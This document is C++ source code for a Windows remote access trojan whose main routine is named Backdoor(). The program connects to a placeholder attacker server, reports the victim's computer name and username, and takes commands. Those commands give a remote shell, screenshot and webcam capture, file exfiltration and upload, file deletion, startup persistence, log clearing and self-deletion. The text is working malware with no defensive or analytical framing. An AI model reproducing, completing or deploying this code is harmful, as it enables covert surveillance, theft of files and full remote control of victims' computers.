#include <iostream>
#include <unistd.h>
#include <windows.h>
#include <fstream>
#include <vector>
#include <algorithm>
#include <dirent.h>
#include <dshow.h>

const std::string SERVER = "<SERVER IP>";
const int PORT = 5005;

std::vector<std::string> logs;
std::string username = getenv("username");
std::string computer = getenv("computername");
std::string appdata = getenv("appdata");
std::string command, data;

std::string fileName = "";
std::string firstPath = "";
std::string startupPath = "C:/Users/" + username + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/";

SOCKET objSocket;
char buffer[8192];
const bool startup = false;
const int TIMEOUT = 300000;

#include "RegisterStartup.cpp"
#include "VBSMessageBox.cpp"
#include "CaptureScreenshot.cpp"
#include "CaptureWebcam.cpp"
#include "ChangeWallpaper.cpp"
#include "StartProcess.cpp"
#include "RemoteCMD.cpp"
#include "ViewFiles.cpp"
#include "SendFile.cpp"
#include "ReceiveFile.cpp"
#include "ReadFile.cpp"
#include "DeleteFile.cpp"
#include "DeleteSelf.cpp"

void Backdoor()
{
    WSADATA wsdata;
    sockaddr_in client;
    struct in_addr addr;

    if (WSAStartup(MAKEWORD(2, 2), &wsdata) != 0) exit(1);
    addr.s_addr = *(u_long*) gethostbyname(SERVER.data())->h_addr_list[0];
    objSocket = socket(AF_INET, SOCK_STREAM, 0);

    client.sin_family = AF_INET;
    client.sin_port = htons(PORT);
    client.sin_addr.s_addr = inet_addr(inet_ntoa(addr));
    setsockopt(objSocket, SOL_SOCKET, SO_RCVTIMEO, (char*)&TIMEOUT, sizeof(TIMEOUT));

    if (startup) RegisterStartup(fileName);
    if (connect(objSocket, (sockaddr*)&client, sizeof(client)) == SOCKET_ERROR) {
        Sleep(3000);
        closesocket(objSocket);
        WSACleanup();
        Backdoor();
    }
    send(computer + "|" + username);

    while (true)
    {
        memset(buffer, 0, sizeof(buffer));
        command.clear();
        data.clear();

        int server = recv(objSocket, buffer, sizeof(buffer), 0);
        if (server == SOCKET_ERROR || server == NO_BYTES_IN_BUFFER) {
            closesocket(objSocket);
            WSACleanup();
            ClearLogs();
            Backdoor();
        
        } command = buffer;

        if (command == "terminate") {
            closesocket(objSocket);
            WSACleanup();
            exit(0);
		}
        else if (command == "msgbox") {
            VBSMessageBox();
        }
        else if (command == "screenshot") {
            CaptureScreenshot();
        }
        else if (command == "webcam") {
            CaptureWebcam();
        }
        else if (command == "wallpaper") {
            ChangeWallpaper();
        }
        else if (command == "process") {
            StartProcess();
        }
        else if (command == "remote") {
            RemoteCMD();
        }
        else if (command == "shutdown") {
            system("shutdown /p");
        }
        else if (command == "restart") {
            system("shutdown /r");
        }
        else if (command == "lock") {
            system("rundll32.exe user32.dll,LockWorkStation");
        }
        else if (command == "directory") {
            getcwd(buffer, FILENAME_MAX);
            send(buffer);
        }
        else if (command == "files") {
            ViewFiles();
        }
        else if (command == "send") {
            SendFile();
        }
        else if (command == "receive") {
            ReceiveFile();
        }
        else if (command == "read") {
            ReadFile();
        }
        else if (command == "delfile") {
            DeleteFile();
        }
        else if (command == "delself") {
            DeleteSelf();
        }
    }
}

int main()
{
    GetModuleFileNameA(nullptr, buffer, MAX_PATH);
    std::string path = buffer;

    firstPath = path;
    fileName = path.substr(path.find_last_of("/\\") + 1);

    CreateMutexA(0, FALSE, fileName.data());
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        return EXIT_FAILURE;
    }
    else Backdoor();
}
